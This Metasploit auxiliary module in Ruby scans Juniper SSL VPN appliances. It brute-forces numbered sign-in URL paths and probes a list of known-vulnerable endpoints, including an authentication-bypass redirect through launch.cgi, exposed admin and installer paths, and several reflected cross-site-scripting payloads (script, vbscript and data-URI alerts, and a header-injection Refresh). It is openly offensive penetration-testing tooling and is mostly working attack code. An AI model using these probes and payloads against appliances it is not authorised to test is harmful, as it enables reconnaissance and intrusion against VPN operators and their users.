##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Juniper Scan',
			'Description' => %q{
				Brute Juniper URLS 0-100 /dana-na/auth/url_X/welcome.cgi. Correct URL should give a 200, wrong will 302 to 					url_default.  MSF port of Netprotect.ch SWAT VPN Scanner functionality.
			},
			'Author'       => ['CG'],
			'License'     => MSF_LICENSE,
			'DefaultOptions' => {"SSL" => TRUE},
			'References' =>
				[
				[ 'URL', 'http://carnal0wnage.attackresearch.com/2013/05/funky-juniper-urls.html' ],
				[ 'URL', 'http://www.netprotect.ch/tools.html' ],
				[ 'URL', 'http://packetstormsecurity.com/files/95620/Juniper-SSL-VPN-Bypass-Cross-Site-Scripting.html' ],
				],
		)
		register_options(
			[
				Opt::RPORT(443),
				OptInt.new('URL_NUM',        [true, 'How many url number to brute', 100])
			], self.class)
end

	def run_host(ip)

		other_checks = [
			'/dana-na/auth/url_admin/welcome.cgi', #admin access
			'/dana-na/auth/remediate.cgi?action=&step=preauth',	#web root
			'/dana-na/auth/remediate.cgi?step=preauth',	#web root
			'/dana-cached/sc/JuniperSetupClientInstaller.exe',	#setup files
			'/dana-cached/setup/JuniperSetupSP1.cab', #setup files
			'/dana-na/download/?url=/dana/home/launch.cgi?url=http://www.google.com/', #auth bypass replace with internal site
			'/dana-na/meeting/login_meeting.cgi?mid=DEFAULT',	#meeting test
			'/dana-na/auth/url_default/welcome.cgi?p=logout&c=37&u=</script><script>alert(1)</script>',	#XSS Test
			'/dana-na/meeting/meeting_testresult.cgi?redir=/dana-na/meeting/login_meeting.cgi"><script>alert(999)</script>&java=1',	#XSS Test
			'/dana/fb/smb/rd.cgi?si=");alert(999);</script>',	#XSS Test
			'/dana/fb/smb/wu.cgi?dir=foo"><script>alert(999);</script>',	#XSS Test
			'/dana-na/download/?url=/dana/home/launch.cgi?url=vbscript:MsgBox(%2522999%2522)',	#XSS Test
			'/dana-na/download/?url=/dana/home/launch.cgi?url=data:text/html;base64,PHNjcmlwdD5hbGVydCg5OTkpPC9zY3JpcHQ+',	#XSS Test
			'/dana-na/download/?url=/dana/fb/smb/wfmd.cgi?file=AAAAAAA%0aRefresh:%201,URL=javascript:alert(999)%0aFoo:%0a%0a', #XSS Test
			'/dana-na/download/?url=/dana/fb/smb/wfmd.cgi?file=AAAAAAA Refresh: 1,URL=javascript:alert(999) Foo:  ', #XSS Test
			]

		begin
		#URL BRUTE
		(0..datastore['URL_NUM']).each do |brute|
			res = send_request_raw({
				'version'	=> '1.0',
				'uri'		=>  '/dana-na/auth/url_'+brute.to_s+'/welcome.cgi',
				'method'        => 'GET',
				'headers' =>
				{
				}
			}, 15)

			if (res.nil?)
				print_error("no response for #{ip}:#{rport} #{uri}")
			elsif (res.code == 200)
				print_good("#{target_host}:#{rport} Received a HTTP 200 with #{res.headers['Content-Length']} bytes for /dana-na/auth/url_#{brute}/welcome.cgi \n")
					report_note(
						:host	=> ip,
						:proto => 'tcp',
						:ssl => ssl,
						:port	=> rport,
						:ntype => 'juniper url',
						:data	=> "/dana-na/auth/url_#{brute}/welcome.cgi",
						:update => :unique_data
					)

			elsif	(res.code == 302)
				vprint_status("#{target_host}:#{rport} Received #{res.code} --> Redirect to #{target_host}:#{rport} #{res.headers['Location']} for #{brute}")
			else
				vprint_status("#{target_host} response #{res.code}")
			end

		end

		other_checks.each do | check |

			res = send_request_raw({
				'uri'          =>  check,
				'method'       => 'GET',
				}, 15)

			if (res.nil?)
				print_error("no response for #{ip}:#{rport} #{uri}")
			elsif (res.code == 200)
				print_good("#{target_host}:#{rport} Received a HTTP 200 with #{res.headers['Content-Length']} bytes for #{check} \n")
					report_note(
						:host	=> ip,
						:proto => 'tcp',
						:ssl => ssl,
						:port	=> rport,
						:ntype => 'juniper url',
						:data	=> "#{check}",
						:update => :unique_data
					)

			elsif	(res.code == 302)
				vprint_status("#{target_host}:#{rport} Received #{res.code} --> Redirect to #{target_host}:#{rport} #{res.headers['Location']} for #{check}")
			else
				vprint_status("#{target_host} response #{res.code} for #{check}")
			end
		end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout =>e
			print_error(e.message)
		rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
			print_error(e.message)
		end
	end
end

